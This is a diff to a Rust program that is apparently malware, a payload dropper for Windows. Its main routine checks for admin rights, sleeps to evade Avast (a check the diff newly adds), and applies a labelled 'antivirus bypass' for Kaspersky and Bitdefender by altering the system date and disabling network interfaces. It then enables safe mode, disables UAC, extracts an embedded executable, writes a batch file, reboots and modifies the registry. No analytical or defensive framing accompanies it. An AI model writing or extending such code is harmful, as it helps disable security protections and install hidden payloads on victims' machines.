@@ -5,6 +5,7 @@ use std::io::{self, Write};
 use winreg::enums::*;
 use winreg::RegKey;
 use std::fs;
+use std::{thread, time};
 
 fn disable_uac() -> io::Result<()> {
     // Open the registry key for User Account Control
@@ -208,6 +209,14 @@ fn reboot_system() -> io::Result<()> {
     Ok(())
 }
 
+fn check_avast_installed() -> bool {
+    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
+    match hkcu.open_subkey(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Avast") {
+        Ok(_) => true,  // Avast is installed
+        Err(_) => false, // Avast not found
+    }
+}
+
 fn main() {
     // Step 1: Admin Control Check
     if !is_admin() {
@@ -217,7 +226,13 @@ fn main() {
 
     println!("Admin privileges confirmed.");
 
-    // Step 2: Kaspersky, Bitdefender bypass (General Antivirus bypass)
+    // Step 2: Check for Avast Installation
+    if check_avast_installed() {
+        println!("Avast detected. Sleeping for 20 seconds...");
+        thread::sleep(time::Duration::from_secs(20));  // Sleep for 20 seconds
+    }
+
+    // Step 3: Kaspersky, Bitdefender bypass (General Antivirus bypass)
     if let Err(e) = change_system_date() {
         eprintln!("Error changing system date: {}", e);
     }
@@ -226,28 +241,28 @@ fn main() {
         eprintln!("Error disabling network interfaces: {}", e);
     }
 
-    // Step 3: Enable safe mode
+    // Step 4: Enable safe mode
     if let Err(e) = enable_safe_mode() {
         eprintln!("Error enabling safe mode: {}", e);
     }
 
-    // Step 4: Disable UAC
+    // Step 5: Disable UAC
     if let Err(e) = disable_uac() {
         eprintln!("Error disabling UAC: {}", e);
     }
 
-    // Step 5: Extract payload
+    // Step 6: Extract payload
     if let Err(e) = extract_embedded_exe() {
         eprintln!("Error extracting embedded executable: {}", e);
     }
-    
-    // Step 6: Create the batch file in the current directory
+
+    // Step 7: Create the batch file in the current directory
     if let Err(e) = create_batch_file() {
         eprintln!("Error creating batch file: {}", e);
         return;
     }
 
-    // Step 7: Reboot the system to Safe Mode if needed
+    // Step 8: Reboot the system to Safe Mode if needed
     if let Err(e) = reboot_system() {
         eprintln!("Error rebooting system: {}", e);
     }
@@ -256,5 +271,4 @@ fn main() {
     if let Err(e) = modify_registry() {
         eprintln!("Error modifying the registry: {}", e);
     }
-
 }
